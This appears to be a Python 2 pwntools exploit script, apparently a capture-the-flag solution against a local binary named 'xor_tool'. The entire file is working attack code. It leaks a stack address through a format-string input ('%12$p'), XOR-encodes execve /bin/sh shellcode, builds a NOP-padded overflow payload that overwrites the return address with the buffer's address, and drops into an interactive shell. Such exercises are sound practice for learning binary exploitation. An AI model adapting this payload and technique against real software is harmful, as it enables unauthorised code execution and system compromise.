from pwn import *

def xor_payload(payload,key):
  a=''
  for char in payload:
     a+=chr(ord(char) ^ ord(key))
  return a


shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

val = 102
r = process('./xor_tool')

print r.recvuntil('Enter your option: ')

r.sendline('2')
print r.recvuntil(':')
r.sendline('\x00')
print r.recvuntil(':')
r.sendline("%12$p")
leak = r.recvline()
leak=leak.split('Enter your message to decrypt:Your decrypted msg :')[1].strip('\n')
leak = int(leak,16)
buff = leak-val
print "[+] Address of leak:"+hex(leak)
print "[+] Address of buffer:"+hex(buff)
print r.recvuntil('Enter your option: ')
r.sendline('1')
print r.recvuntil(':')
shelcode = xor_payload(shellcode,'\x02')
payload =shelcode+"\x90"*34+"\x02"+"\x90"*(74-len(shelcode)-35)+pack(buff)
r.sendline(payload)
r.interactive()

